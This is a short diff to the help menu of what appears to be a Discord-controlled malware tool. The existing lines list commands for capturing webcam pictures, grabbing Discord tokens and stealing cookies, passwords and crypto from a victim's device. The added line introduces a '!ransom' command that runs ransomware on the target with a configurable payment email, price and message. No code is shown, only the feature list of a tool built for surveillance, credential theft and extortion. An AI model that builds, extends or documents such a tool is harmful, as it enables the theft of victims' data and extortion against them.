@@ -76,6 +76,7 @@ Available commands are :
 --> !webcampic = Take a picture out of the selected webcam
 --> !grabtokens = Grab all discord tokens on the current pc
 --> !steal = Steals all the information from the device (cookies, passwords, crypto,...)
+--> !ransom = Runs a ransomware script on target's device (Add email you want the target to email to for his key, price and message can be configured in script)
 --> !help = This help menu
  
 ```
